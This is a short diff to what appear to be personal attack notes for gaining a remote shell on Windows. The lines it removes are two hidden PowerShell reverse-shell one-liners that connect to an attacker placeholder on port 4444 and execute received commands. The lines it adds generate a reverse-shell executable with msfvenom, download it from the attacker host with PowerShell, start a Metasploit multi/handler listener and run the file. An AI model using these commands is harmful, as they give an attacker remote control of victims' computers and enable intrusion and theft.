@@ -1,3 +1,13 @@
-powershell -nop -w hidden -c "$s=New-Object Net.Sockets.TcpClient('YOUR_IP',4444);$st=$s.GetStream();$enc=[Text.Encoding]::ASCII; $prompt='PS '+(Get-Location).Path+'> '; $st.Write($enc.GetBytes($prompt),0,$prompt.Length); $b=0..65535|%{0}; while(($i=$st.Read($b,0,$b.Length)) -ne 0){$d=$enc.GetString($b,0,$i); try{$r=Invoke-Expression $d 2>&1|Out-String}catch{$_|Out-String}|%{$_ -replace '\r?\n$',''}; $r+=[Environment]::NewLine+$prompt; $o=$enc.GetBytes($r); $st.Write($o,0,$o.Length)}"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o rev.exe
 
-powershell -nop -w hidden -c "$s=(New-Object Net.Sockets.TCPClient('YOUR_IP',4444)).GetStream();$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$r=cmd /c $d 2>&1|Out-String;$o=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($o,0,$o.Length)}"
+powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://YOUR_IP/rev.exe','rev.exe')"
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/shell_reverse_tcp   # hoặc meterpreter nếu dùng
+set LHOST YOUR_IP
+set LPORT 4444
+run
+
+
+rev.exe
